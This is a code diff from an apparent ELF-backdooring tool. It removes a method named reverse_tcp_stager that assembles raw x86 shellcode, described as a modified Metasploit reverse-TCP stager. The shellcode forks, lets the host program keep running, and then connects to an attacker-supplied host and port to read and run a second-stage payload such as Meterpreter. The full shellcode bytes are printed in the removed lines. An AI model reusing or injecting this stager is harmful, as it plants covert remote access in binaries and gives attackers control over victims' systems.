@@ -89,35 +89,6 @@ class linux_elfI32_shellcode():
         self.shellcode = self.shellcode1
         return (self.shellcode1)
 
-    def reverse_tcp_stager(self, CavesPicked={}):
-        """
-        FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
-        Modified metasploit payload/linux/x64/shell/reverse_tcp
-        to correctly fork the shellcode payload and contiue normal execution.
-        """
-        if self.PORT is None:
-            print ("Must provide port")
-            return False
-
-        self.shellcode1 = "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
-        #will need to put resume execution shellcode here
-        self.shellcode1 += "\xbd"
-        self.shellcode1 += struct.pack("<I", self.e_entry)
-        self.shellcode1 += "\xff\xe5"
-        self.shellcode1 += ("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80"
-                            "\x97\x5b\x68")
-        #HOST
-        self.shellcode1 += self.pack_ip_addresses()
-        self.shellcode1 += "\x68\x02\x00"
-        #PORT
-        self.shellcode1 += struct.pack('!H', self.PORT)
-        self.shellcode1 += ("\x89\xe1\x6a"
-                            "\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\xb2\x07\xb9\x00\x10"
-                            "\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x5b"
-                            "\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\xff\xe1")
-
-        self.shellcode = self.shellcode1
-        return (self.shellcode1)
 
     def user_supplied_shellcode(self, CavesPicked={}):
         """
